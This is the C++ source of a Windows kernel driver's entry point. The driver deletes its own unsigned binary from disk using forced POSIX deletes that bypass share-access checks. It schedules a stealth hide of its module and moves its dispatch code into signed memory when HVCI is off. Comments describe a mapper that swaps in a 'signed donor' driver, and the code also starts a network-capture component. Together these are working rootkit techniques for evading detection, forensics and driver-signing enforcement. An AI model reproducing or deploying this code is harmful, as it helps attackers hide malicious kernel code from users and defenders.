#include <ntifs.h>
#include <Crypter.h>
#include <imports/Defs.h>
#include <function/Dispatcher.h>
#include <function/Stealth.h>
#include <function/CoreSecurity.h>
#include <function/AntiDebug.h>

namespace net_capture {
    NTSTATUS initialize(PDEVICE_OBJECT devObj);
    void cleanup();
}

constexpr ULONG TAG_DEL = 'leDW';

// POSIX delete: FileDispositionInformationEx (class 64) with POSIX semantics
// immediately unlinks the directory entry even when an image section is mapped
// (which is the case for a loaded .sys — NtLoadDriver creates a SECTION_OBJECT
// backed by the file, blocking all standard deletion methods).
// Available on Windows 10 1607+ / NTFS.
#ifndef FILE_DISPOSITION_FLAG_DELETE
#define FILE_DISPOSITION_FLAG_DELETE                 0x00000001
#endif
#ifndef FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
#define FILE_DISPOSITION_FLAG_POSIX_SEMANTICS       0x00000002
#endif
#ifndef FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE
#define FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE 0x00000010
#endif

// FILE_DISPOSITION_INFORMATION_EX is provided by WDK's ntddk.h.
// FileDispositionInformationEx enum value = 64.
static constexpr FILE_INFORMATION_CLASS FileDispositionInformationExClass =
    static_cast<FILE_INFORMATION_CLASS>(64);

static BOOLEAN ForceDeleteFileByPath(PUNICODE_STRING FilePath)
{
    if (!FilePath || !FilePath->Buffer || !_ZwSetInformationFile)
        return FALSE;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, FilePath,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Tier 0 — POSIX delete via FileDispositionInformationEx.
    // This is the only method that works on a loaded driver image because
    // POSIX semantics unlink the directory entry immediately while the
    // data stream stays alive until the last section reference is released.
    // IO_IGNORE_SHARE_ACCESS_CHECK bypasses the implicit share-access
    // conflict caused by the mapped image section.
    // IMPORTANT: FILE_WRITE_ATTRIBUTES is strictly required for IGNORE_READONLY_ATTRIBUTE.
    if (_IoCreateFileEx) {
        HANDLE fileHandle = NULL;
        IO_STATUS_BLOCK ioStatus = {};
        IO_DRIVER_CREATE_CONTEXT createCtx = {};
        createCtx.Size = sizeof(createCtx);

        NTSTATUS status = _IoCreateFileEx(
            &fileHandle,
            DELETE | SYNCHRONIZE | FILE_WRITE_ATTRIBUTES, // <-- Added FILE_WRITE_ATTRIBUTES
            &objAttr,
            &ioStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0,
            CreateFileTypeNone,
            NULL,
            IO_IGNORE_SHARE_ACCESS_CHECK,
            &createCtx
        );

        if (NT_SUCCESS(status)) {
            struct {
                ULONG Flags;
            } dispEx = {};
            
            dispEx.Flags = FILE_DISPOSITION_FLAG_DELETE
                         | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
                         | FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE;

            status = _ZwSetInformationFile(
                fileHandle, &ioStatus,
                &dispEx, sizeof(dispEx),
                FileDispositionInformationExClass
            );
            _ZwClose(fileHandle);

            if (NT_SUCCESS(status))
                return TRUE;
        }
    }

    // Tier 1 — Direct ZwDeleteFile (works only if no image section is mapped)
    if (_ZwDeleteFile) {
        NTSTATUS st = _ZwDeleteFile(&objAttr);
        if (NT_SUCCESS(st))
            return TRUE;
    }

    // Tier 2 — IoCreateFileEx with FILE_DELETE_ON_CLOSE
    HANDLE fileHandle = NULL;
    IO_STATUS_BLOCK ioStatus = {};
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    if (_IoCreateFileEx) {
        IO_DRIVER_CREATE_CONTEXT createCtx = {};
        createCtx.Size = sizeof(createCtx);
        status = _IoCreateFileEx(
            &fileHandle,
            DELETE | SYNCHRONIZE,
            &objAttr,
            &ioStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, // Can't map readonly but fallback
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE,
            NULL, 0,
            CreateFileTypeNone,
            NULL,
            IO_IGNORE_SHARE_ACCESS_CHECK,
            &createCtx
        );
    }

    if (!NT_SUCCESS(status)) {
        // Tier 3 — Standard ZwCreateFile with delete share
        status = ZwCreateFile(
            &fileHandle,
            DELETE | SYNCHRONIZE,
            &objAttr,
            &ioStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0
        );
    }

    if (!NT_SUCCESS(status))
        return FALSE;

    // Set disposition to delete on close
    struct {
        BOOLEAN DeleteFile;
    } dispInfo = { TRUE };
    
    status = _ZwSetInformationFile(
        fileHandle, &ioStatus,
        &dispInfo, sizeof(dispInfo),
        (FILE_INFORMATION_CLASS)13 // FileDispositionInformation
    );

    _ZwClose(fileHandle);
    return NT_SUCCESS(status);
}

static VOID DeleteDriverOnDisk(PUNICODE_STRING RegistryPath)
{
    if (!RegistryPath || !RegistryPath->Buffer)
        return;

    if (!_ZwOpenKey || !_ZwQueryValueKey || !_ZwClose)
        return;

    OBJECT_ATTRIBUTES keyAttr;
    InitializeObjectAttributes(&keyAttr, RegistryPath,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE keyHandle = NULL;
    NTSTATUS status = _ZwOpenKey(&keyHandle, KEY_READ, &keyAttr);
    if (!NT_SUCCESS(status))
        return;

    UNICODE_STRING valueName;
    _RtlInitUnicodeString(&valueName, L"ImagePath");

    ULONG kvSize = 0;
    status = _ZwQueryValueKey(keyHandle, &valueName,
        KeyValuePartialInformation, NULL, 0, &kvSize);
    
    if (status != STATUS_BUFFER_TOO_SMALL && status != STATUS_BUFFER_OVERFLOW) {
        _ZwClose(keyHandle);
        return;
    }

#pragma warning(push)
#pragma warning(disable: 4996)
    // IMPORTANT: Stealth functions are NOT initialized synchronously. 
    // We MUST use standard ExAllocatePoolWithTag to prevent a silent null-pointer crash here.
    auto kvInfo = static_cast<PKEY_VALUE_PARTIAL_INFORMATION>(
        ExAllocatePoolWithTag(NonPagedPool, kvSize, TAG_DEL));
#pragma warning(pop)

    if (!kvInfo) {
        _ZwClose(keyHandle);
        return;
    }

    status = _ZwQueryValueKey(keyHandle, &valueName,
        KeyValuePartialInformation, kvInfo, kvSize, &kvSize);
    _ZwClose(keyHandle);

    if (!NT_SUCCESS(status) ||
        (kvInfo->Type != REG_SZ && kvInfo->Type != REG_EXPAND_SZ)) {
        ExFreePoolWithTag(kvInfo, TAG_DEL);
        return;
    }

    // Safely construct the string to ensure proper null-termination parsing
    ULONG dataLen = kvInfo->DataLength;
    if (dataLen >= sizeof(WCHAR)) {
        PWCHAR imgBuf = (PWCHAR)kvInfo->Data;
        ULONG chars = dataLen / sizeof(WCHAR);
        if (imgBuf[chars - 1] == L'\0') {
            chars--;
        }
        
        UNICODE_STRING imagePath;
        imagePath.Buffer = imgBuf;
        imagePath.Length = (USHORT)(chars * sizeof(WCHAR));
        imagePath.MaximumLength = (USHORT)dataLen;

        ForceDeleteFileByPath(&imagePath);
    }

    ExFreePoolWithTag(kvInfo, TAG_DEL);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {

    if (!SetupFunctions()) {
        return STATUS_UNSUCCESSFUL;
    }

    if (!device_names::initialize_names()) {
        return STATUS_UNSUCCESSFUL;
    }

    UNICODE_STRING deviceName = {};
    _RtlInitUnicodeString(&deviceName, device_names::get_device_name());

    PDEVICE_OBJECT deviceObject = nullptr;

    NTSTATUS status = _IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status)) {
        return status;
    }

    UNICODE_STRING symLink = {};
    _RtlInitUnicodeString(&symLink, device_names::get_symlink_name());

    _IoDeleteSymbolicLink(&symLink);

    status = _IoCreateSymbolicLink(&symLink, &deviceName);
    if (!NT_SUCCESS(status)) {
        _IoDeleteDevice(deviceObject);
        return status;
    }

    SetFlag(deviceObject->Flags, DO_BUFFERED_IO);

    DriverObject->MajorFunction[IRP_MJ_CREATE]         = dispatcher::Pilot;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = dispatcher::Pilot;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatcher::Controller;

    DriverObject->DriverUnload = nullptr;

    if (DriverObject->DriverSection) {
        auto ldrEntry = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
        ldrEntry->Flags |= 0x20u;
    }

    ClearFlag(deviceObject->Flags, DO_DEVICE_INITIALIZING);

    status = net_capture::initialize(deviceObject);
    if (!NT_SUCCESS(status)) {
        _IoDeleteSymbolicLink(&symLink);
        _IoDeleteDevice(deviceObject);
        return status;
    }

    stealth::ScheduleDelayedHide(DriverObject);

    if (!hvci_detect::is_hvci_enabled()) {
        signed_memory::RelocateDispatchToSignedMemory(DriverObject, 0x800);
    }

    // Delete our unsigned binary from disk — registry ImagePath still points to
    // the target file at this point (mapper swaps to signed donor AFTER NtLoadDriver returns)
    DeleteDriverOnDisk(RegistryPath);

    return STATUS_SUCCESS;
}